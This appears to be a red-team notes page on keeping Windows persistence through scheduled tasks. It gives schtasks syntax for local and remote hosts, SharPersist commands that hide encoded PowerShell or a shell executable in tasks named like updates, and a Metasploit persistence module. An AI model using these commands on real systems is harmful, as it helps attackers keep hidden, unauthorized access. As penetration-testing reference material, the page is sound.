# Schtasks

## 01 - Command Prompt

### 2.1 - Help Menu

#### 2.1.1 - Create Task Syntax

```
C:\> schtasks /create /tn "<task_name>" /tr "<commands>" /sc <minute | hourly | daily | weekly | monthly | once | onstart | onlogon | onidle> <[/st HH:MM:SS | /st <MM/DD/YYYY>]> [/sd <MM/DD/YYYY>] [/it] [/ru <DOMAIN>\<username>] [/rp <password>] [/s <target_IP>]

/create => create a schedule task
/sc => type of schedule
/st => start time
/tn => task name
/tr => task run
/it => Make it interactive when the user is using his computer
/s => computer IP
/ru => specify the username: { [DOMAIN_name]\<username> | system }
/rp => specify the password
```

#### 2.1.2 - Run Task Syntax

```
C:\> schtasks /run /tn "<task_name>" [/ru <DOMAIN>\<username>] [/rp <password>] [/s <target_IP>]
```

#### 2.1.2 - Stop Task Syntax

```
C:\> schtasks /stop /tn "<task_name>" [/ru <DOMAIN>\<username>] [/rp <password>] [/s <target_IP>]
```

#### 2.1.3 - Delete Task Syntax

```
C:\> schtasks /delete /f /tn "<task_name>" [/ru <DOMAIN>\<username>] [/rp <password>] [/s <target_IP>]
```

#### 2.1.4 - Query Task Syntax

```
C:\> schtasks /query /f /tn "<task_name>" [/ru <DOMAIN>\<username>] [/rp <password>] [/s <target_IP>]
```

### 2.2 - Usage

```
C:\> net time

PS C:\> Get-Date

C:\> schtasks /query /tn "<task_name>" /fo List /v /s <IP>

C:\> schtasks /delete /tn "<task_name>" /tr "<commands>" /sc once /st <HH:mm> /s <IP> /ru [DOMAIN]\<username> /rp <password>

C:\> schtasks /create /tn "<task_name>" /tr "<commands>" /sc once /st <HH:mm> /s <IP> /ru system
```

## 02 - SharPersist

```
C:\> SharPersist.exe -t schtask -c "C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64_encoded>" -n "Updater" -m add -o hourly

C:\> SharPersist.exe -t schtask -c "C:\Windows\System32\cmd.exe" -a "/c C:\path\to\shell.exe" -n "Patch" -m add -o logon

C:\> SharPersist.exe -t schtaskbackdoor -c "C:\Windows\System32\cmd.exe" -a "/c C:\path\to\shell.exe" -n "Patch" -m check

C:\> SharPersist.exe -t schtaskbackdoor -m list -o logon
```

## 03 - Metasploit

TODO: Fill this info

```
msf > use exploit/windows/local/s4u_persistence
```

---
## References

- [[Windows Post Exploitation Persistence References]]

- [Persistence Scheduled Tasks](https://pentestlab.blog/2019/11/04/persistence-scheduled-tasks/)

- [Cobalt Strike: Schtasks Persistence with Powershell one liners](https://www.cobaltstrike.com/blog/schtasks-persistence-with-powershell-one-liners/)